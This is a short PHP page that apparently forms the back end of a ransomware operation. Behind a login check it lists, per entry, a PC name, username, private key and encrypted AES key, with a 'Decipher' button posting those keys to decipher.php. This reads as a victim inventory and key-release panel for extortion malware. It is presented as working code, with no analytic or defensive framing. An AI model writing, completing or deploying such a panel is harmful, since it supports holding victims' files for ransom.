<?php

session_start();

if( $_SESSION['auth'] != 1 ) {
    header("Location: login.php");
    exit;
}

include 'db.php';

$q = $connection->query('SELECT * FROM dummy');

?>

<html>
  <head>
	<link rel="stylesheet" type="text/css" href="styling.css">
  </head>
  <body>

	<table cellspacing='0'>
	  <tr>
	  	<th>Identifier</th>
	  	<th>PC Name</th>
	  	<th>Username</th>
	  	<th>Private Key</th>
	  	<th>Encrypted AES Key</th>
	  	<th>Decipher</th>
	  </tr>
	  <?php
	  	$i = 0;
	  	
	  	foreach($q AS $row) {
	  		echo "<tr" . ($i % 2 ? " class='even'" : "") . ">
	  		<td>".htmlentities($row[id])."</td>
	  		<td>".htmlentities($row[pcname])."</td>
	  		<td>".htmlentities($row[username])."</td>
	  		<td>".htmlentities($row['privatekey']) . "</td>
	  		<td>".htmlentities($row[aesencrypted])."</td>
	  		<td>
	  		 <form action=\"decipher.php\" method=POST>
				<input type=\"hidden\" name=\"privatekey\" value=\"" . htmlentities($row['privatekey']) . "\">
				<input type=\"hidden\" name=\"aesencrypted\" value=\"" . htmlentities($row['aesencrypted']) . "\">
				<input type=\"submit\" value=\"Decipher\">
			</form>
	  		</td>
	  		</tr>";
	  		$i++;
	  	}
	  ?>
	</table>
  </body>
</html>
